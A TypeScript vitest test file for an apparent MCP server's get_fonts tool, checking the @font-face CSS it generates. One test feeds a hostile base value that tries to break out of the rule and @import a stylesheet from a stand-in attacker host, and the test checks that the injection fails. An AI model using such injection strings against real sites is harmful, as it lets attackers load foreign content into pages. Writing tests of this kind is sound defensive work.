// Covers get_fonts with css: the @font-face rules a web app can paste, and that nothing but css asks for them.
// One of the server-*.test.ts files, kept small so the files run in parallel; the shared setup is in support.ts.

import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { installed, startShared, structured } from './support.js';

describe.skipIf(!installed)('get_fonts css', () => {
  let client: import('@modelcontextprotocol/sdk/client/index.js').Client;

  beforeAll(async () => {
    ({ client } = await startShared());
  });
  afterAll(async () => {
    await client?.close();
  });

  const call = (args: Record<string, unknown>) => client.callTool({ name: 'get_fonts', arguments: args });

  it('returns one @font-face rule for each font file, under the base, when css is asked for', async () => {
    const answer = structured(await call({ css: true, base: '/fonts/' }));
    const fontFace: string = answer.fontFace;
    expect(answer.files.length).toBeGreaterThan(1);
    expect(fontFace.match(/@font-face \{/g)).toHaveLength(answer.files.length);
    for (const file of answer.files) expect(fontFace).toContain(`url("/fonts/${file.file.split('/').pop()}")`);
  });

  it('returns no fontFace when css is not asked for', async () => {
    expect(structured(await call({})).fontFace).toBeUndefined();
  });

  it('does not let a hostile base close the rule or start another', async () => {
    const answer = structured(await call({ css: true, base: '/f/");}@import url(//evil.example/x.css);a{b:"/' }));
    const rules = (answer.fontFace as string).split('\n\n').filter((block) => block.startsWith('@font-face'));
    expect(rules).toHaveLength(answer.files.length);
    for (const rule of rules) expect(rule.match(/[{}]/g)).toHaveLength(2);
  });

  it('refuses a base without css, as the command line does', async () => {
    expect((await call({ base: '/fonts/' })).isError).toBe(true);
  });
});
